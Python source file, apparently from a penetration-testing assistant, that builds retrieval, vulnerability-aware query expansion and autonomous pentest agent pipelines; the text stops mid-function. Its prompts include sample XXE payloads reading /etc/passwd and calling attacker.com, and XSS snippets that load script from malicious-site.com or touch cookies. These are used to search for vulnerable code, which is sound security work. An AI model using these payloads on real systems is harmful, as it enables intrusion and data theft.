import json
import logging
import os
import re
from typing import Dict, List, Optional, Any, Tuple, Iterable, Callable, Union, Set

import chromadb
from chromadb import AsyncClientAPI
from haystack import Pipeline, component, Document
from haystack.components.agents import Agent
from haystack.components.builders import PromptBuilder, ChatPromptBuilder
from haystack.components.embedders import SentenceTransformersTextEmbedder
from haystack.components.joiners import ListJoiner
from haystack.components.tools import ToolInvoker
from haystack.core.component import Component
from haystack.dataclasses import ChatMessage, ChatRole
from haystack.tools import Toolset
from haystack_experimental.chat_message_stores import InMemoryChatMessageStore
from haystack_experimental.components.retrievers import ChatMessageRetriever
from haystack_experimental.components.writers import ChatMessageWriter
from haystack_integrations.components.retrievers.chroma import ChromaEmbeddingRetriever
from haystack_integrations.document_stores.chroma import ChromaDocumentStore
from haystack_integrations.tools.mcp import StreamableHttpServerInfo, MCPToolset
from mcp import Tool

from shyhurricane.doc_type_model_map import doc_type_to_model, get_chroma_collections
from shyhurricane.generator_config import GeneratorConfig
from shyhurricane.prompts import pentester_agent_system_prompt, pentester_chat_system_prompt
from shyhurricane.utils import documents_sort_unique

logger = logging.getLogger(__name__)


async def create_chroma_client(db: str) -> AsyncClientAPI:
    if re.match(r'\S+:\d+$', db):
        host, _, port = db.rpartition(':')
        return await chromadb.AsyncHttpClient(host=host, port=int(port))
    return await chromadb.AsyncHttpClient(host="127.0.0.1", port=8200)


def create_chrome_document_store(db: str, **kwargs) -> ChromaDocumentStore:
    if re.match(r'\S+:\d+$', db):
        host, _, port = db.rpartition(':')
        return ChromaDocumentStore(host=host, port=int(port), **kwargs)
    return ChromaDocumentStore(host="127.0.0.1", port=8200, **kwargs)


async def list_collections(db: str) -> List[str]:
    """Return collection names using a raw Chroma client."""
    client = await create_chroma_client(db)
    return [c.name for c in (await client.list_collections())]


@component
class CombineDocs:
    def __init__(self, collections: Iterable[str]) -> None:
        input_types = {k: List[Document] for k in collections}
        component.set_input_types(self, **input_types)

    @component.output_types(documents=List[Document])
    def run(self, doc_types: Iterable[str], **kwargs):
        merged = []
        for docs in kwargs.values():
            merged.extend(docs)

        # increase score when document is from doc_type
        if doc_types:
            for doc in merged:
                if doc.meta.get("type", None) in doc_types and doc.score:
                    doc.score *= 10
        merged.sort(key=lambda d: (d.score or 0, d.meta.get("timestamp_float", 0)), reverse=True)
        return {"documents": merged}


@component
class TraceDocs:
    """
    Stores queries and documents into a file for debugging.
    """

    def __init__(self, file: str | os.PathLike[str] = "trace_documents.md") -> None:
        self.file = file

    @component.output_types()
    def run(self, query: str, expanded_queries: List[str], documents: List[Document]):
        with open(self.file, "a", encoding="utf-8") as f:
            f.write(f"# Q: {query}\n\n")
            f.write("## Q expanded:\n")
            for eq in expanded_queries:
                f.write(f"- {eq}\n")
            f.write("\n")
            for doc in documents:
                f.write(f"## {doc.meta["url"]}\n")
                f.write(f"Score: {doc.score}\n\n")
                f.write(doc.content[0:1024])
                f.write("\n\n")
            f.write("\n\n---\n\n")
        return {}


@component
class Query:
    @component.output_types(text=str, filters=Dict[str, Any], max_results=int,
                            targets=Iterable[str], doc_types=Iterable[str],
                            progress_callback=Callable[[str], None])
    def run(
            self,
            text: str,
            filters: Optional[Dict[str, Any]] = None,
            targets: Optional[Iterable[str]] = None,
            doc_types: Optional[Iterable[str]] = None,
            max_results: Optional[int] = None,
            progress_callback: Optional[Callable[[str], None]] = None
    ):
        max_results = min(1000, max(1, max_results or 100))
        targets = list(filter(bool, targets or []))
        return {
            "text": text,
            "filters": filters or {},
            "targets": targets or [],
            "doc_types": doc_types or [],
            "max_results": max_results,
            "progress_callback": progress_callback,
        }


vuln_type_prompt = """
You are a cybersecurity assistant helping a security engineer identify web application vulnerability types from user queries. Given a query, produce a deduplicated JSON list of vulnerability types that are either:
 - Explicitly mentioned in the query (e.g., "Find potential XSS vulns" -> ["XSS"])
 - Logically inferred from the language used (e.g., "Is the authentication mechanism secure?" -> ["Weak Authentication"])
 - Be as thorough as you can when inferring vulnerabilities.

The security engineer is helping customers secure their web applications.

Output format:
 - JSON array of strings, where each string is the name of a supported vulnerability type.
 - Only output the list.
 - Do not include any other text except the list of  vulnerability types.
 - Do not include any explanation or commentary.
 - Do not format using markdown or other markup language.
 - Avoid duplicating patterns.

Supported Vulnerability Types:
 - XSS
 - CSRF
 - SSRF
 - SSTI
 - IDOR
 - XXE
 - SQL Injection
 - Command Injection
 - LDAP Injection
 - XPath Injection
 - NoSQL Injection
 - Code Injection
 - Template Injection
 - Weak Authentication
 - Secrets Disclosure
 - Insecure Direct Object Reference
 - Broken Access Control
 - Sensitive Data Exposure
 - Security Misconfiguration
 - Default Credentials
 - Unpatched Software
 - Business Logic Flaw
 - Insecure Design
 - Clickjacking
 - Open Redirect
 - Directory Traversal
 - Insecure Deserialization
 - Rate Limiting Issues
 - Broken Session Management
 - Information Disclosure
 - Unvalidated Redirects and Forwards

If no vulnerabilities are found or inferred, return an empty list.

Example Inputs and Outputs:

Input:
Find potential XSS vulns on example.com
Output:
["XSS"]

Input:
Is the authentication mechanism secure?
Output:
["Weak Authentication"]

Input:
Can users access other users' invoices?
Output:
["IDOR", "Broken Access Control"]

Input:
I think there’s sensitive info in the repo
Output:
["Secrets Disclosure", "Sensitive Data Exposure"]

Input:
Do we need CSRF protection on this POST form?
Output:
["CSRF"]

Input:
Are we protected from server-side request forgery?
Output:
["SSRF"]

Input:
Scan for common web app issues
Output:
["XSS", "CSRF", "SSRF", "IDOR", "XXE", "SQL Injection", "Weak Authentication", "Security Misconfiguration"]

Now, given the following query, output 
Query:
\"{{ query }}\"
"""

query_expander_structure = """
Structure:
Output format:
 - Output the patterns as a list of strings deliminated with lines of "----"
 - Only output the list.
 - Do not include any other text except the list of patterns.
 - Do not include any explanation or commentary.
 - Do not format using markdown or other markup language.
 - Exclude patterns that are only whitespace.
 - Avoid duplicating patterns.
"""

query_expander_natural_language = """
You are a cybersecurity search assistant that processes users queries.
You expand a given query into exactly {{ number }} queries that are similar in meaning, but specific to finding vulnerabilities. The expanded query should not be less specific. Infer vulnerabilities from the query.
Think about it 100 times to get {{ number }} unique queries.

""" + query_expander_structure.replace("patterns", "expanded queries") + """

Examples:
1. Example Query 1: "cross-site scripting mitigation on example.com"
   Example Expanded Queries:
   ----
   XSS prevention techniques
   ----
   sanitizing user input
   ----
   reflected XSS protection
   ----
   stored XSS defense
   ----

2. Example Query 2: "SQL injection exploitation on example.com"  
   Example Expanded Queries:
   ----
   union-based SQL injection
   ----
   blind SQLi attack
   ----
   SQLMap usage examples
   ----
   database extraction via SQLi
   ----

3. Example Query 2: "Can I execute code on example.com?"  
   Example Expanded Queries:
   ----
   cross-site scripting
   ----
   XSS
   ----
   command injection
   ----
   server-side template injection
   ----


Your Task:
Query: "{{query}}"
Never include the URL, hostname or IP address in the expanded queries.
Expanded Queries:
"""

query_expander_javascript = """
You are a code pattern generator trained to identify insecure client-side JavaScript practices.
Think about it 100 times to get {{ number }} unique patterns.

You will receive a single free-text input from the user. It may include:
- One or more vulnerability names (e.g., "XSS", "IDOR", "Open Redirect", etc.)
- Natural language phrases (e.g., "What uses eval or innerHTML?", "Check for anything vulnerable to DOM clobbering or open redirect")
- Informal combinations (e.g., "IDOR or XSS", "maybe eval too", "dangerous access patterns")

Your task:
1. Analyze the input and **infer all relevant client-side vulnerabilities or risky behaviors**.
2. For each inferred item, generate **exactly {{ number }} insecure client-side JavaScript code patterns** that represent real-world usage.

Code Pattern Requirements:
- Must be valid client-side JavaScript (ES5/ES6+)
- Must demonstrate insecure behavior
- Must not be tied to a specific app or domain
- Should use realistic client-side APIs (DOM, window/document, localStorage, etc.)
- Do NOT use Node.js or backend features
- Do NOT show secure or mitigated code—only vulnerable patterns
- Escape all code strings properly for JSON.
- Do not include explanations or comments.
- Keep patterns realistic and relevant to the client-side context.

""" + query_expander_structure.replace("expanded queries", "patterns") + """

Examples:
1. Example Query 1: "What javascript libraries call eval() on example.com" when asked for 10 patterns
    ----
    eval('return ' + code + ';');
    ----
    var json = '{"key": "' + data + '"}';
    return JSON.parse(eval(json));
    ----
    var htmlString = '<div>' + html + '</div>';
    return eval(htmlString);
    ----
    var code = "console.log('Hello World!');";
    executeCode(code);
    ----
    var cssString = 'body { background-color: ' + css + '; }';
    return eval(cssString);
    ----
    var scriptString = 'document.write("' + script + '");';
    return eval(scriptString);
    ----
    var data = "Hello World!";
    var json = '{"key": "' + data + '"}';
    getJSON(json);
    ----
    var xmlString = '<root>' + xml + '</root>';
    return eval(xmlString);
    ----
    var html = 'Hello World!';
    var htmlString = '<div>' + html + '</div>';
    getHTML(htmlString);
    ----
    var css = "red";
    var cssString = 'body { background-color: ' + css + '; }';
    getCSS(cssString);
   
2. Example Query 2: "XSS" when asked for 10 patterns
   ----
   var userInput = document.getElementById('username').value; var maliciousScript = "alert('XSS attack')"; userInput += " + " + maliciousScript;
   ----
   var htmlContent = '<p>Hello, ' + username + '</p>'; document.getElementById('content').innerHTML = htmlContent;
   ----
   var userInput = document.getElementById('username').value; var maliciousScript = "eval(userInput)";
   ----
   var url = "https://example.com/" + username; var xhr = new XMLHttpRequest(); xhr.open("GET", url, true);
   ----
   var userInput = document.getElementById('username').value; var maliciousScript = "window.location.href='https://malicious-site.com/'";
   ----
   var htmlContent = "<script>alert('XSS')</script>"; document.getElementById('content').innerHTML += htmlContent;
   ----
   var userInput = document.getElementById('username').value; var maliciousScript = "document.cookie = 'session_id=evil'";
   ----
   var url = "https://example.com/" + username; var xhr = new XMLHttpRequest(); xhr.open("POST", url, true);
   ----
   var userInput = document.getElementById('username').value; var maliciousScript = "var evilScript = document.createElement('script'); evilScript.src = 'https://malicious-site.com/evil.js'; document.body.appendChild(evilScript)";
   ----
   var htmlContent = "<iframe src='https://example.com/'></iframe>"; document.getElementById('content').innerHTML += htmlContent;
   ----

Now, given a single unstructured user input string, infer the vulnerabilities and generate {{ number }} insecure client-side JavaScript patterns for each one:

{{query}}
"""

query_expander_css = """
You are a static code analysis assistant that receives user queries containing hints about web security vulnerabilities. From the user query, infer one or more common vulnerability types (e.g., XSS, information disclosure, insecure design, etc.) and generate {{ number }} generic CSS code patterns likely to exhibit or relate to those vulnerabilities.
Think about it 100 times to get {{ number }} unique patterns.

Examples of inferred vulnerability types and sample pattern directions:

|Inferred Vulnerability  | Example Pattern Direction             |
|------------------------|---------------------------------------|
| Information disclosure | .debug { display: block; }            |
| Insecure design        | * { visibility: visible !important; } |
| Authentication         | #admin-login { display: block; }      |

Capabilities:
 - Handle multiple vulnerability types in a single input.
 - Recognize synonyms and related keywords.
 - Detect implications.
 - Recognize both code-level and logic-level vulnerabilities.

""" + query_expander_structure.replace("expanded queries", "patterns") + """
- Each pattern should be a valid CSS snippet (selector + rules), inline style, or injection-prone usage.

Now, given a single unstructured user input string, infer the vulnerabilities and generate {{ number }} insecure CSS patterns for each one:

{{query}}
"""

query_expander_html = """
You are a static code analysis assistant that receives user queries containing hints about web security vulnerabilities. From the user query, infer one or more common vulnerability types (e.g., XSS, SQLi, IDOR, insecure deserialization, etc.) and generate {{ number }} generic HTML code patterns likely to exhibit or relate to those vulnerabilities.
Think about it 100 times to get {{ number }} unique patterns.

Examples of inferred vulnerability types and sample pattern directions:

|Inferred Vulnerability   | Example Pattern Direction                       |
|-------------------------|-------------------------------------------------|
|XSS	                  | <input> reflected into DOM unsanitized          |
|SQLi                     | <form> with suspect SQL-like input names        |
|IDOR                     | Hidden fields with user IDs in forms            |
|SSRF                     | <input> fields accepting URLs or IPs            |
|Misconfiguration         | Comments with stack traces or debug info        |
|Sensitive Data Exposure  | Fields named like “key”, “token”, “.env”        |
|Weak Auth/Session        | Login forms with autocomplete or insecure attrs |
|Insecure Deserialization | JavaScript using JSON.parse(untrusted_input)    |
|Template Injection       | {{user}} in HTML with no escaping               |
|Outdated Components      | Script tags with versioned paths or CDNs        |

Capabilities:
 - Handle multiple vulnerability types in a single input.
 - Recognize synonyms and related keywords.
 - Detect implications, such as “What calls eval()?” infers insecure JS execution.
 - Recognize both code-level and logic-level vulnerabilities.
 - For technology specific patterns, vary the technology used. For example: do not only consider PHP.

""" + query_expander_structure.replace("expanded queries", "patterns") + """
 - Each pattern should be a generic HTML snippet (possibly including inline JavaScript or HTML forms) designed to match vulnerable structures.
 - You must infer the vulnerability types from the input text; assume the input may use synonyms or descriptions instead of standard names.

Now, given a single unstructured user input string, infer the vulnerabilities and generate {{ number }} insecure HTML patterns for each one:

{{query}}
"""

query_expander_xml = """
You are a static code and traffic analysis assistant that receives user queries describing potential web application vulnerabilities. From the user query, infer one or more common vulnerability types (e.g., XXE, SSRF, IDOR, insecure deserialization, etc.), and generate {{ number }} generic XML data patterns likely to exhibit or relate to those vulnerabilities. Consider the XML to be data or configuration, not HTML or source code.
Think about it 100 times to get {{ number }} unique patterns.

Examples of inferred vulnerability types and sample pattern directions:

|Inferred Vulnerability    | Example Pattern Direction                               |
|--------------------------|---------------------------------------------------------|
| XXE / SSRF               | External entity injections                              |
| Insecure Deserialization | Base64 or serialized binary blobs in tags               |
| IDOR / Access Control    | Direct reference to user IDs                            |
| Sensitive Data Exposure  | API keys, passwords, encryption keys in plaintext       |
| XPath Injection          | Dynamic filter strings with unvalidated user input      |
| Insecure Configuration   | Debug flags, default credentials, exposed admin configs |
| Broken Authentication    | Weak password policies or session tokens in XML         |

Capabilities:
 - Handle multiple vulnerability types in a single input.
 - Recognize synonyms and related keywords.
 - Detect implications.
 - Patterns must be valid XML snippets that would appear in XML.
 - Only output the patterns, do not include comments or titles.
 - Ensure patterns are varied and reflect plausible real-world vulnerable constructs.

""" + query_expander_structure.replace("expanded queries", "patterns") + """

Examples:
1. Example Query 1: "XXE"
    ----
    <!DOCTYPE foo [
      <!ELEMENT foo ANY >
      <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
    <foo>&xxe;</foo>
    ----
    <!DOCTYPE foo [
      <!ENTITY xxe SYSTEM "http://attacker.com/secret" >]>
    <foo>&xxe;</foo>
    ----
    <!DOCTYPE foo [
      <!ENTITY xxe SYSTEM "http://attacker.com:8080/admin" >]>
    <foo>&xxe;</foo>
    ----
    <!DOCTYPE root [
      <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >]>
    <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
      <soap:Body>
        <getFile>
          <filename>&xxe;</filename>
        </getFile>
      </soap:Body>
    </soap:Envelope>
    ----

Now, given a single unstructured user input string, infer the vulnerabilities and generate {{ number }} insecure XML data patterns for each one:

{{query}}
"""

query_expander_network = """
You are a static code and traffic analysis assistant that receives queries describing potential web application vulnerabilities. From the user query, infer one or more common vulnerability types (e.g., XSS, SQLi, IDOR, SSRF, weak authentication, insecure deserialization, etc.), and generate {{ number }} HTTP header name/value combinations likely to indicate these vulnerabilities.
Think about it 100 times to get {{ number }} unique patterns.

Examples of inferred vulnerability types and sample pattern directions:

|Inferred Vulnerability | Example Pattern Direction                                   |
|-----------------------|-------------------------------------------------------------|
| Cookies               | Set-Cookie: sessionid=abc123 (no Secure/HttpOnly/ SameSite) |
| Cookies               | Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9        |
| XSS                   | Content-Security-Policy: default-src *                      |
| XSS                   | Content-Security-Policy: script-src 'unsafe-inline'         |
| Weak Authentication   | Authorization: Basic dXNlcjpwYXNz                           |
| Weak Authentication   | WWW-Authenticate: Digest realm="example"                    |
| Info Leakage          | X-Powered-By:                                               |
| Unvalidated Redirects | Location: //evil.com                                        |

Capabilities:
 - Handle multiple vulnerability types in a single input.
 - Recognize synonyms and related keywords.
 - Detect implications, such as “How can I run code in the browser?” infers cross-site scripting (XSS).
 - Recognize both code-level and logic-level vulnerabilities.

""" + query_expander_structure.replace("expanded queries", "patterns") + """
- Each string must be a generic HTTP header line formatted as:
  Header-Name: header value
 - Header values may be exact, partial, or suggestive of vulnerability conditions.
 - Ensure outputs span both request and response headers where applicable.

Now, given a single unstructured user input string, infer the vulnerabilities and generate {{ number }} insecure HTTP headers and values for each one:

{{query}}
"""


@component
class VulnTypeParser:

    @component.output_types(vuln_types=List[str])
    def run(self, replies: List[str]):
        logger.debug(f"VulnTypeParser: replies {replies}")
        vuln_types = []
        for reply in replies:
            try:
                parsed = json.loads(reply)
                if isinstance(parsed, Iterable):
                    vuln_types.extend(map(lambda e: str(e).lower().replace(' ', '_'), parsed))
            except json.decoder.JSONDecodeError:
                pass
        return {"vuln_types": vuln_types}


@component
class QueryExpander:
    target_placeholders = ["example.com", "{NETLOC}"]
    split_head = re.compile(r"^----+\s*(.*)")
    split_tail = re.compile(r"(.*)\s*----+$")

    def __init__(
            self,
            generator_config: GeneratorConfig,
            prompt: Optional[str] = None,
            doc_type: Optional[str] = None,
            number: int = 5,
            include_original_query: bool = True,
    ):

        self.query_expansion_prompt = prompt
        self.doc_type = doc_type or "nl"
        self.number = number
        self.include_original_query = include_original_query
        if prompt is None:
            self.query_expansion_prompt = query_expander_natural_language
        builder = PromptBuilder(self.query_expansion_prompt, required_variables=["number", "query"])
        llm = generator_config.create_generator(temperature=0.6)
        self.pipeline = Pipeline()
        self.pipeline.add_component("builder", builder)
        self.pipeline.add_component("llm", llm)
        self.pipeline.connect("builder", "llm")

    def _split_results(self, result: str) -> Set[str]:
        expanded_set: Set[str] = set()
        collected = ""
        for line in result.split("\n"):
            head_match = self.split_head.match(line)
            if head_match:
                line = head_match.group(1).strip()
                if collected.strip():
                    expanded_set.add(collected.strip())
                    collected = ""
            tail_match = self.split_tail.match(line)
            if tail_match:
                line = tail_match.group(1).strip()
                collected = '\n'.join([collected, line])
                if collected.strip():
                    expanded_set.add(collected.strip())
                    collected = ""
            if line:
                collected = '\n'.join([collected, line])
        if collected.strip():
            expanded_set.add(collected.strip())
        return expanded_set

    @component.output_types(queries=List[str])
    def run(self, query: str, targets: Iterable[str], vuln_types: Iterable[str]):
        if self.number <= 1:
            return {"queries": [query]}

        expanded_set: Set[str] = set()

        logger.debug(f"vuln_types: {vuln_types}")
        if vuln_types:
            for vuln_type in vuln_types:
                vuln_query_path = os.path.join(os.path.dirname(__file__),
                                               "assets/" + vuln_type + "_" + self.doc_type + ".txt")
                logger.info(f"checking {vuln_query_path} for static expanded queries")
                if os.path.exists(vuln_query_path):
                    logger.debug("Reading expanded queries from %s", vuln_query_path)
                    with open(vuln_query_path, "r") as f:
                        expanded_set.update(self._split_results(f.read()))
        logger.debug(f"static expanded queries: {expanded_set}")

        retry = 2
        while retry > 0 and len(expanded_set) < self.number:
            retry -= 1

            run_result = self.pipeline.run({'builder': {'query': query, 'number': self.number}})
            replies: List[str] = run_result.get('llm', {}).get('replies', [])
            if not replies:
                continue
            result = replies[0]
            logger.info(f"Expanded query result:\n{result}")
            if not result:
                continue

            expanded_set.update(self._split_results(result))

        expanded_list: List[str] = list(expanded_set)[:self.number]
        if self.include_original_query:
            expanded_list.insert(0, query)

        # apply targets
        expanded_with_targets = []
        if targets:
            for expanded_query in expanded_list:
                placeholder_found = False
                for placeholder in self.target_placeholders:
                    if placeholder in expanded_query:
                        for target in targets:
                            # set here in case targets is empty
                            placeholder_found = True
                            expanded_with_targets.append(expanded_query.replace(placeholder, target))
                if not placeholder_found:
                    expanded_with_targets.append(expanded_query)
        else:
            expanded_with_targets = expanded_list

        return {"queries": expanded_with_targets}


@component
class MultiQueryChromaRetriever:
    def __init__(self, name: str, embedder: SentenceTransformersTextEmbedder, retriever: ChromaEmbeddingRetriever):
        self.name = name
        self.embedder = embedder
        self.retriever = retriever

    def warm_up(self):
        self.embedder.warm_up()

    @component.output_types(documents=List[Document])
    def run(self,
            queries: List[str],
            top_k: int,
            filters: Optional[Dict[str, Any]] = None,
            progress_callback: Optional[Callable[[str], None]] = None,
            ):
        top_k = min(1000, max(1, top_k))
        results = []
        ids = set()
        for query in queries:
            logger.info(f"Querying {self.name}: {query}")
            try:
                if progress_callback is not None:
                    progress_callback(f"Querying {self.name}: {query}")
                result = self.retriever.run(
                    query_embedding=self.embedder.run(query)["embedding"],
                    filters=filters,
                    top_k=top_k)
                found_count = 0
                for doc in result['documents']:
                    if doc.id not in ids:
                        found_count += 1
                        results.append(doc)
                        ids.add(doc.id)
                logger.info(f"Query for {self.name}: {query} found {found_count} documents")
            except Exception as e:
                logger.error(f"Exception querying chroma database: {str(e)}, filters={filters}", exc_info=e)

        unique_docs = documents_sort_unique(results)

        return {"documents": unique_docs}


def create_tools(mcp_urls: Optional[List[str]] = None, shim: Callable[[Tool], Tool] = None) -> Tuple[
    Toolset, List[MCPToolset]]:
    if mcp_urls is None:
        mcp_urls = ["http://127.0.0.1:8000/mcp/"]
    mcp_toolsets = []
    tools = []
    for mcp_url in mcp_urls:
        toolset = MCPToolset(
            server_info=StreamableHttpServerInfo(url=mcp_url),
            invocation_timeout=600.0
        )
        mcp_toolsets.append(toolset)
        if shim is not None:
            tools.extend(list(map(lambda t: shim(t), toolset)))
        else:
            if len(mcp_urls) == 1:
                return toolset, mcp_toolsets
            tools.extend(list(toolset))
    return Toolset(tools=tools), mcp_toolsets


@component
class ChatMessageLogger:
    def __init__(self, label: str):
        self.label = label

    @component.output_types()
    def run(self, messages: List[ChatMessage]):
        if not messages:
            logger.debug(f"{self.label}: No messages received")
            # print(f"{self.label}: No messages received")
        for idx, message in enumerate(messages):
            if message.tool_call_results:
                msg = f"{self.label}: Message {idx}: {message.role}: {"\\n".join(map(lambda r: r.result, message.tool_call_results))}"
            else:
                msg = f"{self.label}: Message {idx}: {message.role}: {message.texts}"
            logger.debug(msg)
            # print(msg.replace("\\n", "\n"))
        return {}


@component
class ChatPromptTemplateBuilder:
    def __init__(self, system_prompt: List[ChatMessage]):
        self.system_prompt = system_prompt

    @component.output_types(messages=List[ChatMessage])
    def run(self, memories: List[ChatMessage], query: List[ChatMessage]):
        messages = []
        messages.extend(self.system_prompt)
        messages.extend(memories)
        messages.extend(query)
        return {"messages": messages}


@component
class ChatMessageFilter:
    @component.output_types(messages=List[ChatMessage])
    def run(self, messages: List[ChatMessage]):
        filtered = []
        for message in messages:
            # ollama chat generator fails if a ChatMessage has no content
            text_contents = message.texts
            tool_calls = message.tool_calls
            tool_call_results = message.tool_call_results
            images = message.images
            if text_contents or tool_calls or tool_call_results or images:
                filtered.append(message)
        return {"messages": filtered}


def build_chat_pipeline(
        generator_config: GeneratorConfig,
        prompt: Optional[List[ChatMessage]] = None,
        mcp_urls: Optional[List[str]] = None,
        tools: Optional[Union[list[Tool], Toolset]] = None,
) -> Tuple[Pipeline, Component, Toolset]:
    """
    Builds a pipeline for an offensive security assistant chat.

    Deprecated: The chat function we want is an agent with instructions for chat, not autonomous.

    :return: Pipeline, generator component
    """

    if not prompt:
        prompt = [ChatMessage.from_system(pentester_chat_system_prompt)]

    tools = tools or create_tools(mcp_urls)
    prompt_builder = ChatPromptBuilder()
    chat_generator = generator_config.create_chat_generator(
        tools=tools,
        generation_kwargs={}
    )
    response_chat_generator = generator_config.create_chat_generator(
        generation_kwargs={}
    )

    memory_store = InMemoryChatMessageStore()
    memory_retriever = ChatMessageRetriever(memory_store, last_k=generator_config.chat_message_retriever_last_k)
    memory_writer = ChatMessageWriter(memory_store)

    pipeline = Pipeline()
    pipeline.add_component("query", ListJoiner(List[ChatMessage]))
    pipeline.add_component("template_builder", ChatPromptTemplateBuilder(prompt))
    pipeline.add_component("prompt_builder", prompt_builder)
    pipeline.add_component("llm", chat_generator)
    pipeline.add_component("tool_invoker", ToolInvoker(tools=tools))
    pipeline.add_component("list_joiner", ListJoiner(List[ChatMessage]))
    pipeline.add_component("memory_filter", ChatMessageFilter())
    pipeline.add_component("memory_retriever", memory_retriever)
    pipeline.add_component("memory_writer", memory_writer)
    pipeline.add_component("memory_joiner", ListJoiner(List[ChatMessage]))
    pipeline.add_component("response_llm", response_chat_generator)
    pipeline.add_component("query_chat_message_logger", ChatMessageLogger("query"))
    pipeline.add_component("prompt_chat_message_logger", ChatMessageLogger("prompt"))
    pipeline.add_component("tool_invoker_chat_message_logger", ChatMessageLogger("tool_invoker"))
    pipeline.add_component("llm_chat_message_logger", ChatMessageLogger("llm"))
    pipeline.add_component("response_llm_chat_message_logger", ChatMessageLogger("response_llm"))

    pipeline.connect("query", "template_builder.query")
    pipeline.connect("query", "memory_joiner.values")
    pipeline.connect("query", "query_chat_message_logger")
    pipeline.connect("memory_retriever", "template_builder.memories")
    pipeline.connect("template_builder", "prompt_builder.template")
    pipeline.connect("prompt_builder.prompt", "llm.messages")
    pipeline.connect("prompt_builder.prompt", "prompt_chat_message_logger.messages")
    pipeline.connect("llm.replies", "tool_invoker.messages")
    pipeline.connect("llm.replies", "list_joiner")
    pipeline.connect("llm.replies", "memory_joiner")
    pipeline.connect("llm.replies", "llm_chat_message_logger")
    pipeline.connect("tool_invoker.tool_messages", "list_joiner")
    pipeline.connect("tool_invoker.tool_messages", "memory_joiner")
    pipeline.connect("tool_invoker.tool_messages", "tool_invoker_chat_message_logger")
    pipeline.connect("list_joiner.values", "response_llm.messages")
    pipeline.connect("response_llm.replies", "memory_joiner")
    pipeline.connect("response_llm.replies", "response_llm_chat_message_logger")
    pipeline.connect("memory_joiner", "memory_filter")
    pipeline.connect("memory_filter", "memory_writer")

    return pipeline, response_chat_generator, tools


@component
class ChatMessageToListAdapter:
    @component.output_types(values=List[ChatMessage])
    def run(self, value: ChatMessage):
        return {"values": [value]}


def build_agent_pipeline(
        generator_config: GeneratorConfig,
        prompt: Optional[List[ChatMessage]] = None,
        mcp_urls: Optional[List[str]] = None,
        tools: Optional[Union[list[Tool], Toolset]] = None,
) -> Tuple[Pipeline, Component, Toolset]:
    """
    Builds a pipeline for an offensive security agent.
    :return: Pipeline
    """

    if not prompt:
        prompt = [ChatMessage.from_system(pentester_agent_system_prompt)]

    system_prompt = "\n".join(map(lambda m: m.text, prompt))

    tools = tools or create_tools(mcp_urls)
    prompt_builder = ChatPromptBuilder()
    template_builder = ChatPromptTemplateBuilder(
        list(filter(lambda m: not m.is_from(ChatRole.SYSTEM), prompt)),
    )
    chat_generator = generator_config.create_chat_generator(
        tools=tools,
        generation_kwargs={}
    )
    assistant = Agent(
        chat_generator=chat_generator,
        tools=tools,
        system_prompt=system_prompt,
        exit_conditions=["text"],
        max_agent_steps=1000,
        raise_on_tool_invocation_failure=False
    )

    memory_store = InMemoryChatMessageStore()
    memory_retriever = ChatMessageRetriever(memory_store, last_k=generator_config.chat_message_retriever_last_k)
    memory_writer = ChatMessageWriter(memory_store)

    pipeline = Pipeline()
    pipeline.add_component("query", ListJoiner(List[ChatMessage]))
    pipeline.add_component("template_builder", template_builder)
    pipeline.add_component("prompt_builder", prompt_builder)
    pipeline.add_component("agent", assistant)
    pipeline.add_component("memory_filter", ChatMessageFilter())
    pipeline.add_component("memory_retriever", memory_retriever)
    pipeline.add_component("memory_writer", memory_writer)
    pipeline.add_component("memory_joiner", ListJoiner(List[ChatMessage]))
    pipeline.add_component("str_to_list", ChatMessageToListAdapter())
    pipeline.add_component("chat_message_logger", ChatMessageLogger("prompt"))

    pipeline.connect("query", "template_builder.query")
    pipeline.connect("query", "memory_joiner.values")
    pipeline.connect("memory_retriever", "template_builder.memories")
    pipeline.connect("template_builder", "prompt_builder.template")
    pipeline.connect("prompt_builder", "agent")
    pipeline.connect("prompt_builder.prompt", "chat_message_logger.messages")

    pipeline.connect("agent.last_message", "str_to_list")
    pipeline.connect("str_to_list", "memory_joiner")
    pipeline.connect("memory_joiner", "memory_filter")
    pipeline.connect("memory_filter", "memory_writer")

    pipeline.warm_up()

    return pipeline, assistant, tools


async def build_document_pipeline(db: str, generator_config: GeneratorConfig) -> Tuple[
    Pipeline, Dict[str, MultiQueryChromaRetriever], Dict[str, ChromaDocumentStore]]:
    """
    Builds a pipeline for retrieving documents from the store.
    :return: Pipeline
    """

    pipe = Pipeline()
    comb = CombineDocs([f"{col}_documents" for col in get_chroma_collections()])
    pipe.add_component("combine", comb)
    pipe.add_component("query", Query())
    pipe.add_component("vuln_type_prompt", PromptBuilder(vuln_type_prompt, required_variables=["query"]))
    pipe.add_component("vuln_type_llm", generator_config.create_generator(temperature=0.1))
    pipe.add_component("vuln_type_parser", VulnTypeParser())
    pipe.add_component("query_expander", QueryExpander(generator_config))
    pipe.connect("query.text", "vuln_type_prompt.query")
    pipe.connect("vuln_type_prompt", "vuln_type_llm")
    pipe.connect("vuln_type_llm", "vuln_type_parser")
    pipe.connect("query.text", "query_expander.query")
    pipe.connect("query.targets", "query_expander.targets")
    pipe.connect("vuln_type_parser", "query_expander")
    pipe.connect("query.doc_types", "combine.doc_types")

    retrievers: Dict[str, MultiQueryChromaRetriever] = {}
    stores: Dict[str, ChromaDocumentStore] = {}

    embedder_cache = dict()
    for doc_type_model in doc_type_to_model().values():
        model_name = doc_type_model.model_name

        if model_name in embedder_cache:
            embedder = embedder_cache[model_name]
        else:
            embedder = SentenceTransformersTextEmbedder(
                model=model_name,
                batch_size=1,
                normalize_embeddings=True,
                trust_remote_code=True,
                progress_bar=False,
                model_kwargs={
                    "attn_implementation": "eager",
                },
            )
            embedder.warm_up()
            embedder_cache[model_name] = embedder

        custom_query_expander = None
        custom_query_expander_name = None
        if doc_type_model.doc_type == "javascript":
            custom_query_expander = QueryExpander(generator_config, prompt=query_expander_javascript, number=10,
                                                  include_original_query=False, doc_type="javascript")
        elif doc_type_model.doc_type == "css":
            custom_query_expander = QueryExpander(generator_config, prompt=query_expander_css, number=5,
                                                  include_original_query=False, doc_type="css")
        elif doc_type_model.doc_type == "html":
            custom_query_expander = QueryExpander(generator_config, prompt=query_expander_html, number=10,
                                                  include_original_query=False, doc_type="html")
        elif doc_type_model.doc_type == "xml":
